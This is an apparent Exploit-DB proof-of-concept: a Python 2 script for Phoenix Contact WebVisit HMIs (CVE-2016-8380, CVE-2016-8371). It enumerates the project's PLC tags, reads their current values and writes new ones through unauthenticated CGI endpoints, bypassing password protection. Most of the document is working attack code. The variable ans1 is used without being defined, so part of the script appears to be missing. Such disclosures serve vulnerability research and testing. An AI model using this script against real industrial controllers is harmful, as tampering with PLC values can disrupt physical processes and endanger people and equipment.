# Date: 2018-09-30
# Exploit Author: Deneut Tijl
# Vendor Homepage: www.phoenixcontact.com
# Software Link: https://www.phoenixcontact.com/online/portal/nl/?uri=pxc-oc-itemdetail:pid=2985725&library=nlnl&pcck=P-19-05-01&tab=5
# Version: WebVisit (all versions)
# CVE : CVE-2016-8380, CVE-2016-8371
 
# Description
# Script to read and write PLC tags via a Webvisit HMI page (even in case of a password protection)
# Steps:
# * Get Project Name: http://<ip>/
# * Get list of tags: http://<ip>/<projectname>.tcr
# * Get current values of tags: http://<ip>/cgi-bin/ILRReadValues.exe
# * Set new tag values: http://<ip>/cgi-bin/writeVal.exe?<tag>+<value> (urlencode!)
 
# CVE-2016-8380-SetPLCValues.py
 
#! /usr/bin/env python
 
import urllib2
 
strIP = raw_input(&#039;Please enter an IP [192.168.1.200]: &#039;)
if strIP == &#039;&#039;: strIP = &#039;192.168.1.200&#039;
 
try:
    URLResponse = urllib2.urlopen(urllib2.Request(&#039;http://&#039; + strIP + &#039;/&#039;))
except urllib2.HTTPError:
    print(&#039;#### Critical Error with IP &#039; + strIP + &#039;: no response&#039;)
    raw_input(&#039;Press Enter to exit&#039;)
    exit()
 
strProject = &#039;&#039;
for line in URLResponse.readlines():
    if &#039;ProjectName&#039; in line:
        strProject = line.split(&#039;VALUE="&#039;)[1].split(&#039;"&#039;)[0]
 
if strProject == &#039;&#039;:
    print(&#039;#### Error, no \&#039;ProjectName\&#039; found on the main page&#039;)
    raw_input(&#039;Press Enter to exit&#039;)
    exit()
 
print(&#039;---- Found project \&#039;&#039; + strProject + &#039;\&#039;, retrieving list of tags&#039;)
 
try:
    TagResponse = urllib2.urlopen(urllib2.Request(&#039;http://&#039; + strIP + &#039;/&#039; + strProject + &#039;.tcr&#039;))
except urllib2.HTTPError:
    print(&#039;#### Critical Error with IP &#039; + strIP + &#039;: /&#039; + strProject + &#039;.tcr not found&#039;)
    raw_input(&#039;Press Enter to exit&#039;)
    exit()
 
arrTagList = []
for line in TagResponse.readlines():
    if line.startswith(&#039;#!-- N =&#039;):
        intNumberOfTags = int(line.split(&#039;=&#039;)[1])
        print(&#039;---- There should be &#039; + str(intNumberOfTags) + &#039; tags:&#039;)
    if not line.startswith(&#039;#&#039;):
        if not line.split(&#039;;&#039;)[0].strip() == &#039;&#039;:
            arrTagList.append(line.split(&#039;;&#039;)[0].strip())
            print(&#039;-- &#039;+line.split(&#039;;&#039;)[0].strip())
 
 
raw_input(&#039;Press Enter to query them all&#039;)
import os, urllib
os.system(&#039;cls&#039; if os.name == &#039;nt&#039; else &#039;clear&#039;)
strPost = &#039;<body>&#039;
strPost += &#039;<item_list_size>&#039; + str(len(arrTagList)) + &#039;</item_list_size>&#039;
strPost += &#039;<item_list>&#039;
for item in arrTagList:
    strPost += &#039;<i><n>&#039; + item + &#039;</n></i>&#039;
strPost += &#039;</item_list></body>&#039;
DataResponse = urllib2.urlopen(urllib2.Request(&#039;http://&#039; + strIP + &#039;/cgi-bin/ILRReadValues.exe&#039;, strPost)).read()
 
arrData = []
for item in DataResponse.split(&#039;<i>&#039;):
    if &#039;<n>&#039; in item:
        name = item.split(&#039;<n>&#039;)[1].split(&#039;</n>&#039;)[0]
        value = item.split(&#039;<v>&#039;)[1].split(&#039;</v>&#039;)[0]
        arrData.append((name,value))
print(&#039;----- Full list of tags and their values:&#039;)
i = 0
for item in arrData:
    i += 1
    print(str(i) + &#039;: Tag &#039; + item[0] + &#039; has value: &#039; + item[1])
 
if ans1 == &#039;&#039;:
    exit()
strTag = arrData[int(ans1) - 1][0]
strVal = arrData[int(ans1) - 1][1]
ans2 = raw_input(&#039;Setting value for &#039; + strTag + &#039; [&#039; + strVal + &#039;]: &#039;)
if ans2 == &#039;&#039;: ans2 = strVal
urllib2.urlopen(urllib2.Request(&#039;http://&#039; + strIP + &#039;/cgi-bin/writeVal.exe?&#039; + urllib.quote_plus(strTag) + &#039;+&#039; + str(ans2)))

